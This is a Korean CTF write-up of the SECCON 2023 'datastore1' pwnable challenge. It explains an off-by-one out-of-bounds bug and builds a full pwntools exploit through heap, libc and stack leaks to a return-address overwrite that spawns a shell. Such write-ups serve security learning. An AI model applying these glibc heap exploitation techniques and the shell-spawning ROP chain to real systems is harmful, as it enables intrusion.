+++
title = "SECCON CTF 2023 Quals - datastore1"
date = "2024-10-04"
description = "SECCON CTF 2023 Quals pwnable challenge"

[taxonomies]
tags = ["ctf", "pwnable", "out of bound", "heap overflow", "unsorted bin"]
+++

## 0x00. Introduction
``` bash
[*] '/home/user/datastore1'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
```

### Structure
``` c
typedef struct {
  type_t type;

  union {
    struct Array *p_arr;
    struct String *p_str;
    uint64_t v_uint;
    double v_float;
  };
} data_t;

typedef struct Array {
  size_t count;
  data_t data[];
} arr_t;

typedef struct String {
  size_t size;
  char *content;
} str_t;
```

데이터를 특이한 방식으로 저장해서 처음에 적응하기 까다로웠다.

어렵게 생각하지 말고 어떤 데이터를 `data_t`에 저장하는데, 데이터의 유형에 따라 다른 방식으로 저장한다고 생각하면 된다.

### Concept
``` bash
➜  ./datastore1

MENU
1. Edit
2. List
0. Exit
> 1

Current: <EMPTY>
Select type: [a]rray/[v]alue
> a
input size: 4

MENU
1. Edit
2. List
0. Exit
> 2

List Data
<ARRAY(4)>
[00] <EMPTY>
[01] <EMPTY>
[02] <EMPTY>
[03] <EMPTY>
```

입력값에 따라 heap에 데이터를 자유롭게 저장하거나 조회할 수 있다.


## 0x01. Vulnerability
취약점은 `edit()` 함수에서 `Array`를 다룰 때 발생한다.

``` c
static int edit(data_t *data){
  ...
  switch(data->type){
    case TYPE_ARRAY:
      arr_t *arr = data->p_arr;

      printf("index: ");
      unsigned idx = getint();
      if(idx > arr->count)
        return -1;
      ...
  }
}
```

입력한 `idx` 값이 `arr->count`보다 큰 지 검증하는데, 두 값이 같을 경우를 검증하지 않아 OOB가 발생한다.

예를 들어 `arr->count`가 `4`이면 `data[0]~data[3]`이 생성되는데, 있지도 않은 `data[4]`에 접근할 수 있어 `arr` 바로 다음 영역에 접근할 수 있다.

새삼 이 간단한 취약점으로 쉘이 따인다니 놀랍다... 역시 취약점은 우선 exploitability를 막론하고 bug를 찾는다는 관점으로 봐야하는 것 같다.


## 0x02. Exploit
### Heap leak
우선 취약점을 트리거하기 위해 다음과 같이 `Array`를 할당한다.

``` python
    edit(s, 'u', [], 'a', 1)
    edit(s, 'u', [0], 'a', 4)
    edit(s, 'u', [0, 0], 'a', 4)
    edit(s, 'u', [0, 1], 'a', 4)
    edit(s, 'u', [0, 2], 'a', 4)
    edit(s, 'u', [0, 3], 'a', 4)
```

여기에서 `edit()`의 세 번째 인자에 들어가는 list는 `Array`의 `index`를 뜻하는데, 예를 들면 다음과 같다.

- [] : `root->*p_arr`
- [0] : [00]
- [0, 1] : [00] -> [01]

그러므로 `edit(s, 'u', [0, 1], 'a', 4)`의 의미는 **"[00] -> [01] 위치에 길이가 `4`인 `arr_t`를 생성한다"** 는 의미를 가진다.

이렇게 `data_t` 객체들을 생성하면 메모리는 다음과 같다.

``` bash
# root : 0x5555555592a0
gef➤  x/2gx 0x5555555592a0
0x5555555592a0: 0x00000000feed0001      0x00005555555592c0
# []
gef➤  x/3gx 0x00005555555592c0
0x5555555592c0: 0x0000000000000001      0x00000000feed0001
0x5555555592d0: 0x00005555555592e0
# [0]
gef➤  x/9gx 0x00005555555592e0
0x5555555592e0: 0x0000000000000004      0x00000000feed0001
0x5555555592f0: 0x0000555555559330      0x00000000feed0001
0x555555559300: 0x0000555555559380      0x00000000feed0001
0x555555559310: 0x00005555555593d0      0x00000000feed0001
0x555555559320: 0x0000555555559420
# [0, 0]
gef➤  x/10gx 0x0000555555559330
0x555555559330: 0x0000000000000004      0x0000000000000000      # [0, 0, 0]
0x555555559340: 0x0000000000000000      0x0000000000000000      # [0, 0, 1]
0x555555559350: 0x0000000000000000      0x0000000000000000      # [0, 0, 2]
0x555555559360: 0x0000000000000000      0x0000000000000000      # [0, 0, 3]
0x555555559370: 0x0000000000000000      0x0000000000000051      # [0, 0, 4] < OOB
# [0, 1]
gef➤  x/9gx 0x0000555555559380
0x555555559380: 0x0000000000000004      0x0000000000000000
0x555555559390: 0x0000000000000000      0x0000000000000000
0x5555555593a0: 0x0000000000000000      0x0000000000000000
0x5555555593b0: 0x0000000000000000      0x0000000000000000
0x5555555593c0: 0x0000000000000000
```

Heap에서 연속적으로 chunk를 할당해주어 `[0, 0]`과 `[0, 1]`이 인접한 메모리 구조를 확인할 수 있다.

따라서 OOB 취약점을 이용해서 존재하지 않는 `[0, 0, 4]`에 접근하게 되면 `0x555555559378`~`0x555555559380` 영역을 overwrite할 수 있게 된다.

- `0x555555559378` : `[0, 1]` chunk의 header
- `0x555555559380` : `[0, 1]->count`

`show()` 함수에서 객체의 크기를 참조하여 `data_t->type`과 함께 출력해주므로, `count`에 어떤 주소가 쓰이도록 할 수 있다면 leak이 가능하다.

``` bash
Current: <ARRAY(4)>
[00] <ARRAY(4)>
[01] <ARRAY(4)>
[02] <ARRAY(4)>
[03] <ARRAY(4)>
```

`[0, 0, 4]`에 새로운 `arr_t`를 할당할 경우, 다음과 같이 할당이 된다.

- `0x555555559378` : `[0, 1]` chunk의 header -> `data_t->type`
- `0x555555559380` : `[0, 1]->count` -> `data_t->*p_arr`

그런데 `[0, 0, 4]`에 접근 시 `edit()`에서 `show()` 함수를 호출해 현재 저장된 데이터의 상태를 보여준다.

``` c
static int edit(data_t *data){
  if(!data)
    return -1;

  printf("\nCurrent: ");
  show(data, 0, false);
  ...
}
```

이 때 `data_t->type`에 chunk size인 `0x51`이 저장되어있고 이는 `type_t`에 정의되지 않은 값이기 때문에 `show()` 함수에서 `exit()`이 호출되어버린다.

``` c
static int show(data_t *data, unsigned level, bool recur){
  ...
  switch(data->type){
    case TYPE_EMPTY:
      puts("<EMPTY>");
      break;
    ...
    default:
      puts("<UNKNOWN>");
      exit(1);
  }
  return 0;
}
```

따라서 `arr_t` 생성 전에 `edit()`의 `delete`를 이용하여 `data_t->type`으로 해석되는 값을 0으로 초기화할 필요가 있다.

``` python
    # overwrite arr_t.count of [0, 1]
    edit(s, 'd', [0, 0, 4])
    edit(s, 'u', [0, 0, 4], 'a', 2)
```

이렇게 overwrite에 성공하면 `[0, 1]->count` 부분에 새로운 `arr_t` 주소가 담기게 되고, `show()`를 이용해 값을 출력할 수 있다.

### Heap overflow
이제 `arr_t`로 heap leak이 가능했으니 다른 구조체인 `str_t`을 이용해 exploit을 시도하려고 했다.

``` c
typedef struct String {
	size_t size;
	char *content;
} str_t;
```

OOB를 이용해 `size`, `*content`를 덮으면 임의 주소를 read / write할 수 있겠다는 생각이 들었다.

``` python
    edit(s, 'u', [0, 2, 0], 'v', "A" * 0x10)
    edit(s, 'u', [0, 2, 1], 'v', "B" * 0x10)
    edit(s, 'u', [0, 2, 2], 'v', "C" * 0x10)
```

위 payload를 이용해 `str_t` 객체들을 할당하면 메모리 구조는 다음과 같다.

``` bash
gef➤  x/10gx 0x0000555555559420
0x555555559420: 0x0000000000000004      0x0000000000000000      # [0, 3]
0x555555559430: 0x0000000000000000      0x0000000000000000
0x555555559440: 0x0000000000000000      0x0000000000000000
0x555555559450: 0x0000000000000000      0x0000000000000000
0x555555559460: 0x0000000000000000      0x0000000000000021
gef➤
0x555555559470: 0x0000000000000001      0x0000000000000000      # [0, 0, 4]
0x555555559480: 0x0000000000000000      0x0000000000000021
0x555555559490: 0x4141414141414141      0x4141414141414141      # [0, 2, 0]->content
0x5555555594a0: 0x0000000000000000      0x0000000000000051
0x5555555594b0: 0x0000000555555559      0xaf03f4adbccb3443      # leftover buf
gef➤
0x5555555594c0: 0x0000000000000000      0x0000000000000000
0x5555555594d0: 0x0000000000000000      0x0000000000000000
0x5555555594e0: 0x0000000000000000      0x0000000000000000
0x5555555594f0: 0x0000000000000000      0x0000000000000021 
0x555555559500: 0x0000000000000010      0x0000555555559490      # [0, 2, 0] ; "AAAA"
```

이렇게 OOB 취약점을 이용해서 `[0, 2, 0]`의 `size`와 `*content`를 덮고 싶어도 인접한 영역에 할당되지 않는데, `create()`에서 입력을 받는 방식 때문에 발생하는 문제이다.

``` c
static int create(data_t *data){
  ...
  else {        // type == 'v'
    char *buf, *endptr;

    printf("input value: ");
    scanf("%70m[^\n]%*c", &buf);
    if(!buf){
      getchar();
      return -1;
    }
    ...
    str_t *str = (str_t*)malloc(sizeof(str_t));
    if(!str){
      free(buf);
      return -1;
    }
    str->size = strlen(buf);
    str->content = buf;
    buf = NULL;

    data->type = TYPE_STRING;
    data->p_str = str;
fin:
    free(buf);
  }
  return 0;
}
```

`scanf()`를 보면 특이한 formatter를 사용하는데, `m`은 GNU 확장 기능 중 하나로 heap 메모리를 할당하여 입력값을 저장한다.

자세히 보면 `buf`에 입력을 받은 다음 주소를 `str->content`에 넣어놓고 `free()`시키는데, 어차피 `buf`가 `NULL`로 초기화되기 때문에 아무런 해제가 일어나지는 않는다.

어찌됐건 `scanf()`를 할 때 `70`바이트를 입력받기 위해 메모리를 할당하고, 입력값을 저장한 뒤 나머지 메모리는 해제하는 동작을 수행한다.

이 과정에서 heap을 사용하기 때문에 `str_t`보다 `buf`가 먼저 할당되어 인접한 영역에 `[0, 2, 0]`이 할당되지 않는다.

따라서 `str_t`의 chunk size와 동일한 크기를 가지는 chunk를 해제해두고 `create()`를 호출하도록 payload를 작성해야한다.

이를 위해 heap leak 과정에서 `[0, 1]->count`를 overwrite할 때 chunk size가 0x20이 되도록 `arr_t->count`가 `1`인 객체를 `[0, 0, 4]`에 생성하였다.

``` python
    # free [0, 0, 4] (0x20 chunk) and reallocate it to [0, 2, 0] (str_t, also 0x20)
    edit(s, 'd', [0, 0, 4])
    edit(s, 'u', [0, 2, 0], 'v', "A" * 0x30)
    edit(s, 'u', [0, 2, 1], 'v', "B" * 0x10)
    edit(s, 'u', [0, 2, 2], 'v', "C" * 0x10)
```

이렇게 payload를 작성한 뒤 메모리를 보면 다음과 같다.

``` bash
gef➤  x/10gx 0x0000555555559420
0x555555559420: 0x0000000000000004      0x0000000000000000      # [0, 3]
0x555555559430: 0x0000000000000000      0x0000000000000000
0x555555559440: 0x0000000000000000      0x0000000000000000
0x555555559450: 0x0000000000000000      0x0000000000000000
0x555555559460: 0x0000000000000000      0x0000000000000021
gef➤
0x555555559470: 0x0000000000000010      0x0000555555559490      # [0, 2, 0] ; "AAAA"
0x555555559480: 0x0000000000000000      0x0000000000000021
0x555555559490: 0x4141414141414141      0x4141414141414141      # [0, 2, 0]->content
0x5555555594a0: 0x0000000000000000      0x0000000000000051
0x5555555594b0: 0x0000000555555559      0x5d50bdc37f682be0      # leftover buf
gef➤
0x5555555594c0: 0x0000000000000000      0x0000000000000000
0x5555555594d0: 0x0000000000000000      0x0000000000000000
0x5555555594e0: 0x0000000000000000      0x0000000000000000
0x5555555594f0: 0x0000000000000000      0x0000000000000021
0x555555559500: 0x4242424242424242      0x4242424242424242      # [0, 2, 1]->content
```

이제야 `[0, 2, 0]`이 `[0, 3]`과 인접하게 할당되었으므로 OOB 취약점을 이용할 수 있다.

``` python
    # now that [0, 2, 0] is where [0, 0, 4] was, overwrite str_t.size of [0, 2, 0]
    edit(s, 'd', [0, 3, 4])
    edit(s, 'u', [0, 3, 4], 'v', 0x1000)
```

위 payload와 같이 `[0, 3, 4]`에 접근하여 `v_uint`로 해석되게끔 `0x1000`을 입력하면 메모리에 다음과 같이 저장된다.

``` bash
gef➤  x/8gx 0x555555559460
0x555555559460: 0x0000000000000000      0x00000000feed0003
0x555555559470: 0x0000000000001000      0x0000555555559490      # [0, 2, 0] ; "AAAA"
0x555555559480: 0x0000000000000000      0x0000000000000021
0x555555559490: 0x4141414141414141      0x4141414141414141
```

`str_t` 구조체인 `[0, 2, 0]->size` 영역에 `0x1000`이 쓰여졌으니 이 객체를 이용하여 `*content`에 저장된 주소인 `0x555555559490`부터 `0x1000`바이트를 자유롭게 overwrite할 수 있다.

### Libc leak
문제를 풀 때는 뚜렷한 목적성 없이 *"heap overflow가 가능하니까 일단 chunk size를 덮어서 libc leak을 해야겠다"*고 생각했는데...

*"PIE도 켜져있고 Full Relro도 적용되어있으니 GOT overwrite는 포기하고 libc leak -> stack leak을 해서 return address를 덮어야겠다"*가 올바른 사고의 과정인 것 같다.

아무튼 chunk를 `unsorted bin`으로 보내서 `main_arena` 주소가 담기게하는 기법을 통해 libc leak을 진행하였다.

이 때 몇 가지 맞춰야 할 조건이 있었는데, 그렇지 않으면 chunk가 `unsorted bin`으로 보내지지 않는다.

- chunk size가 0x420 이상일 것
- 해당 chunk의 다음 영역에 chunk가 존재할 것(`next_chunk`)
- `next_chunk`가 top chunk가 아닐 것

특히 세 번째 조건과 반대로 `next_chunk`가 top chunk일 경우 그냥 top chunk에 병합되어버려서 chunk가 `unsorted bin`으로 보내지지 않는다.

조건을 하나씩 맞추기 위해 앞서 heap overflow 상황에서의 메모리를 보면,

``` bash
gef➤  x/20gx 0x555555559470
0x555555559470: 0x0000000000001000      0x0000555555559490      # [0, 2, 0] ; "AAAA"
0x555555559480: 0x0000000000000000      0x0000000000000021
0x555555559490: 0x4141414141414141      0x4141414141414141      # [0, 2, 0]->content
0x5555555594a0: 0x0000000000000000      0x0000000000000051
0x5555555594b0: 0x0000000555555559      0x2da0f37bfd770960
0x5555555594c0: 0x0000000000000000      0x0000000000000000
0x5555555594d0: 0x0000000000000000      0x0000000000000000
0x5555555594e0: 0x0000000000000000      0x0000000000000000
0x5555555594f0: 0x0000000000000000      0x0000000000000021
0x555555559500: 0x4242424242424242      0x4242424242424242      # [0, 2, 1]->content
gef➤
0x555555559510: 0x0000000000000000      0x0000000000000051
0x555555559520: 0x000055500000c1e9      0x2da0f37bfd770960
0x555555559530: 0x0000000000000000      0x0000000000000000
0x555555559540: 0x0000000000000000      0x0000000000000000
0x555555559550: 0x0000000000000000      0x0000000000000000
0x555555559560: 0x0000000000000000      0x0000000000000021
0x555555559570: 0x0000000000000010      0x0000555555559500      # [0, 2, 1] ; "BBBB"
0x555555559580: 0x0000000000000000      0x0000000000000021
0x555555559590: 0x4343434343434343      0x4343434343434343      # [0, 2, 2]->content
0x5555555595a0: 0x0000000000000000      0x0000000000000051
gef➤
0x5555555595b0: 0x000055500000c079      0x2da0f37bfd770960
0x5555555595c0: 0x0000000000000000      0x0000000000000000
0x5555555595d0: 0x0000000000000000      0x0000000000000000
0x5555555595e0: 0x0000000000000000      0x0000000000000000
0x5555555595f0: 0x0000000000000000      0x0000000000000021
0x555555559600: 0x0000000000000010      0x0000555555559590      # [0, 2, 2] ; "CCCC"
0x555555559610: 0x0000000000000000      0x0000000000000021
0x555555559620: 0x0000000555555559      0x2da0f37bfd770960
0x555555559630: 0x0000000000000000      0x0000000000000051
0x555555559640: 0x000055500000c0e9      0x2da0f37bfd770960
```

`[0, 2, 2]`의 chunk size를 `0x421`로 바꿔 `free()`시킨 후 `main_arena` 주소가 쓰이면 `[0, 2, 1]->*content`를 `[0, 2, 2]` 주소로 바꿔 출력을 하게끔 시나리오를 구성했다.

따라서 chunk size overwrite와 `[0, 2, 1]->*content`를 바꾸는 것을 고려해서 payload를 다음과 같이 작성했다.

이 때 다른 chunk들을 건들이면 `free()`에서 에러가 발생해 구조를 그대로 유지하도록 작성하였다.

``` python
    # overwrite chunk_size of [0, 2, 2] ("CCCC")
    payload = b"A" * 0x10
    payload += p64(0) + p64(0x51)
    payload += b"\x00" * 0x40
    payload += p64(0) + p64(0x21)
    payload += b"B" * 0x10
    payload += p64(0) + p64(0x51)
    payload += b"\x00" * 0x40
    payload += p64(0) + p64(0x21)
    payload += p64(0x10) + p64(heap + 0x600)    # set [0, 2, 1]->content to [0, 2, 2]
    payload += p64(0) + p64(0x21)
    payload += b"C" * 0x10
    payload += p64(0) + p64(0x51)
    payload += b"\x00" * 0x40
    payload += p64(0) + p64(0x421)
    edit(s, 'u', [0, 2, 0], 'e', payload)
```

이제 두 번째, 세 번째 조건을 맞추기 위한 payload는 다음과 같다.

``` python
    # align top chunk; nextchunk of 0x420 chunk should not be top chunk
    edit(s, 'u', [0, 2, 3], 'a', 0x10)
    edit(s, 'u', [0, 2, 3, 0], 'a', 0x10)
    edit(s, 'u', [0, 2, 3, 1], 'a', 0x10)
    edit(s, 'u', [0, 2, 3, 2], 'a', 0x5)
    edit(s, 'u', [0, 2, 3, 3], 'a', 0x1)        # next_chunk
```

`[0, 2, 3, 2]`까지만 객체들을 생성하면 `[0, 2, 2]`의 `next_chunk`가 top chunk가 되므로 `[0, 2, 3, 3]`을 꼭 생성해주어야 한다.

``` bash
Current: <ARRAY(4)>
[00] <S> AAAAAAAAAAAAAAAA
[01] <S> \xe0\xac\xfa\xf7\xff\x7f
[02] <EMPTY>
[03] <ARRAY(16)>
index: 
```

### Stack leak
Libc 주소가 있으니 `environ` 변수를 이용해서 stack leak이 가능하다.

``` python
    # arbitrary read (environ)
    payload = b"A" * 0xe0
    payload += p64(0x10) + p64(libc + lib.symbols['environ'])
    edit(s, 'u', [0, 2, 0], 'e', payload)
```

앞에서는 chunk 할당과 해제를 하기 때문에 chunk 구조를 맞춰서 payload를 작성했는데, 이제는 그럴 필요가 없으니 `[0, 2, 1]`과의 offset만 잘 맞춰주면 leak이 가능하다.

### RET overwrite
마지막으로 RIP control을 위해서 `return address`를 덮기로 했다.

먼저 `[0, 2, 1]->*content`가 `main()`의 `return address`가 저장된 stack 주소를 가리키도록 설정했다.

이후 libc에 있는 가젯을 이용하여 인자를 설정하고 `system()` 함수를 호출했는데, `syscall` 당시의 stack alignment가 맞지 않아 `pop rdi; pop rbp` 가젯을 사용했다.

``` python
    # arbitrary write (ret of main)
    payload = b"B" * 0xe0
    payload += p64(0x20) + p64(ret)
    edit(s, 'u', [0, 2, 0], 'e', payload)

    pop_rdi_rbp = 0x2a745
    payload = p64(libc + pop_rdi_rbp)
    payload += p64(libc + next(lib.search(b"/bin/sh")))
    payload += b"C" * 8
    payload += p64(libc + lib.symbols['system'])
    edit(s, 'u', [0, 2, 1], 'e', payload)
```


## 0x03. Payload
``` python
from pwn import *
from pwnlib.util.packing import p32, p64, u32, u64
from time import sleep
from argparse import ArgumentParser

BINARY = "chall"
LIBRARY = "libc.so.6"
CONTAINER = "c471d11acd2a"
code_base = 0x555555554000
bp = {
    'ret_main' : 0x555555555418,
}

def edit(s, u_d, index, a_v='a', num=0):
    s.sendline(b"1")
    r = s.recvuntil(b">\n")
    if r.find(b"EMPTY") > 0:
        create(s, a_v, num)
    elif r.find(b"ARRAY") > 0:
        for c, i in enumerate(index):
            s.recvuntil(b"index: ")
            s.sendline(str(i).encode())
            s.recvuntil(b"> ")
            if c == len(index) - 1:
                if u_d == 'u':
                    s.sendline(b"1")
                if u_d == 'd':
                    s.sendline(b"2")
                    return s.recvuntil(b"\n> ")
            else:
                s.sendline(b"1")
        create(s, a_v, num)
    return s.recvuntil(b"\n> ")

def create(s, a_v, num):
    s.recvuntil(b"> ")
    if a_v == 'a':
        s.sendline(b"a")
        s.recvuntil(b"size: ")
        s.sendline(str(num).encode())
    elif a_v == 'v':
        s.sendline(b"v")
        s.recvuntil(b"value: ")
        s.sendline(str(num).encode())
    else:
        s.sendline(num)

def show(s):
    s.sendline(b"2")
    r = s.recvuntil(b"Exit\n> ")
    return r

gs = f'''
b *{bp["ret_main"]}
continue
'''
context.terminal = ['tmux', 'splitw', '-hf']

def main(server, port, debug):
    if(port):
        s = remote(server, port)
        if debug:
            pid = os.popen(f"sudo docker top {CONTAINER} -eo pid,comm | grep {BINARY} | awk '{{print $1}}'").read()
            gdb.attach(int(pid), gs, exe=BINARY)
    else:
        s = process(BINARY, env={"LD_PRELOAD" : LIBRARY})
        if debug:
            gdb.attach(s, gs)
    elf = ELF(BINARY)
    lib = ELF(LIBRARY)
    log.info(f"root : 0x5555555592a0")
    
    s.recvuntil(b"Exit\n> ")

    edit(s, 'u', [], 'a', 1)
    edit(s, 'u', [0], 'a', 4)
    edit(s, 'u', [0, 0], 'a', 4)
    edit(s, 'u', [0, 1], 'a', 4)
    edit(s, 'u', [0, 2], 'a', 4)
    edit(s, 'u', [0, 3], 'a', 4)
    
    # overwrite arr_t.count of [0, 1]
    edit(s, 'd', [0, 0, 4])
    edit(s, 'u', [0, 0, 4], 'a', 1)
    
    # heap leak
    s.sendline(b"1")
    s.sendlineafter(b"index: ", b"0")
    s.sendlineafter(b"> ", b"1")
    r = s.sendlineafter(b"index: ", b"10")      # invalid index to return menu
    
    heap = int(r.split(b"ARRAY(")[3].split(b")>")[0]) - 0x470
    log.info(f"heap : {hex(heap)}")

    # free [0, 0, 4] (0x20 chunk) and reallocate it to [0, 2, 0] (str_t, also 0x20)
    edit(s, 'd', [0, 0, 4])
    edit(s, 'u', [0, 2, 0], 'v', "A" * 0x10)
    edit(s, 'u', [0, 2, 1], 'v', "B" * 0x10)
    edit(s, 'u', [0, 2, 2], 'v', "C" * 0x10)

    # now that [0, 2, 0] is where [0, 0, 4] was, overwrite str_t.size of [0, 2, 0]
    edit(s, 'd', [0, 3, 4])
    edit(s, 'u', [0, 3, 4], 'v', 0x1000)

    # align top chunk; nextchunk of 0x420 chunk should not be top chunk
    edit(s, 'u', [0, 2, 3], 'a', 0x10)
    edit(s, 'u', [0, 2, 3, 0], 'a', 0x10)
    edit(s, 'u', [0, 2, 3, 1], 'a', 0x10)
    edit(s, 'u', [0, 2, 3, 2], 'a', 0x5)
    edit(s, 'u', [0, 2, 3, 3], 'a', 0x1)        # next_chunk

    # overwrite chunk_size of [0, 2, 2] ("CCCC")
    payload = b"A" * 0x10
    payload += p64(0) + p64(0x51)
    payload += b"\x00" * 0x40
    payload += p64(0) + p64(0x21)
    payload += b"B" * 0x10
    payload += p64(0) + p64(0x51)
    payload += b"\x00" * 0x40
    payload += p64(0) + p64(0x21)
    payload += p64(0x10) + p64(heap + 0x600)    # set [0, 2, 1]->content to [0, 2, 2]
    payload += p64(0) + p64(0x21)
    payload += b"C" * 0x10
    payload += p64(0) + p64(0x51)
    payload += b"\x00" * 0x40
    payload += p64(0) + p64(0x421)
    edit(s, 'u', [0, 2, 0], 'e', payload)

    # move [0, 2, 2] ("CCCC") to unsorted bin
    edit(s, 'd', [0, 2, 2])
    
    # libc leak
    s.sendline(b"1")
    s.sendlineafter(b"index: ", b"0")
    s.sendlineafter(b"> ", b"1")
    s.sendlineafter(b"index: ", b"2")
    s.sendlineafter(b"> ", b"1")
    r = s.sendlineafter(b"index: ", b"10")      # invalid index to return menu

    libc = u64(r.split(b"<S> ")[2].split(b"\n")[0] + b"\x00\x00") - 0x21ace0
    log.info(f"libc : {hex(libc)}")

    # arbitrary read (environ)
    payload = b"A" * 0xe0
    payload += p64(0x10) + p64(libc + lib.symbols['environ'])
    edit(s, 'u', [0, 2, 0], 'e', payload)
    
    # stack leak
    s.sendline(b"1")
    s.sendlineafter(b"index: ", b"0")
    s.sendlineafter(b"> ", b"1")
    s.sendlineafter(b"index: ", b"2")
    s.sendlineafter(b"> ", b"1")
    r = s.sendlineafter(b"index: ", b"10")

    stack = u64(r.split(b"<S> ")[2].split(b"\n")[0] + b"\x00\x00")
    log.info(f"stack : {hex(stack)}")
    ret = stack - 0x120

    # arbitrary write (ret of main)
    payload = b"B" * 0xe0
    payload += p64(0x20) + p64(ret)
    edit(s, 'u', [0, 2, 0], 'e', payload)

    pop_rdi_rbp = 0x2a745
    payload = p64(libc + pop_rdi_rbp)
    payload += p64(libc + next(lib.search(b"/bin/sh")))
    payload += b"C" * 8
    payload += p64(libc + lib.symbols['system'])
    edit(s, 'u', [0, 2, 1], 'e', payload)

    # exit
    s.sendline(b"0")

    s.interactive()

if __name__=='__main__':
    parser = ArgumentParser()
    parser.add_argument('-s', '--server', type=str, default="0.0.0.0")
    parser.add_argument('-p', '--port', type=int)
    parser.add_argument('-d', '--debug', type=int, default=1)
    args = parser.parse_args()
    main(args.server, args.port, args.debug)
```